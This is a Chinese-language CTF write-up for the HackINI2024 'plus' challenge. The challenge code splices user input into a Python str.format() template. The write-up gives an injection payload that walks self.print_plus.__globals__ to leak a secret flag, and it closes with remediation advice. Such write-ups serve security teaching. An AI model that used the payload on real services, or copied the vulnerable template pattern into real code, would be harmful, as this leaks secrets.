# HackINI2024 plus

## 题目简述

服务让用户输入要打印的加号数量，然后把输入直接拼进 Python `str.format()` 的格式说明符。模块全局变量 `secret` 保存 flag，目标是利用格式字符串的属性访问能力，从方法对象的全局命名空间中读取该变量。

## 解题过程

核心代码为：

```python
secret = "shellmates{...}"

class Plus:
    def print_plus(self):
        self.plus = input("give me how many + you want to be printed on the screen : ")
        text = "printing {self.plus} +'s : \n{:+^" + self.plus + "}"
        print(text.format("", self=self))
```

输入原本应是宽度数字，但程序没有验证。提交以下内容：

```text
1}{self.print_plus.__globals__[secret]
```

拼接后，第一个 `}` 提前结束原来的替换字段；后续 `{self.print_plus.__globals__[secret]}` 成为新的替换字段。Python 格式字符串允许沿对象属性和索引访问数据：

- `self.print_plus` 取得绑定方法；
- `.__globals__` 取得定义该方法的模块全局字典；
- `[secret]` 从字典中读取名为 `secret` 的全局变量。

格式化结果因而泄露：

```text
shellmates{AV01d_F0RM4T_$TrIng_MISTaKE$_1N_PYth0N!!!}
```

## 方法总结

Python 格式字符串虽然不能直接调用任意函数，但其属性和索引遍历能力足以泄露对象图中的敏感数据。只要用户输入能够改变 `{...}` 字段结构，就不能把它拼进格式模板。安全做法是保持模板为常量，将宽度转换为整数并设置合理上限，再通过单独参数完成格式化。
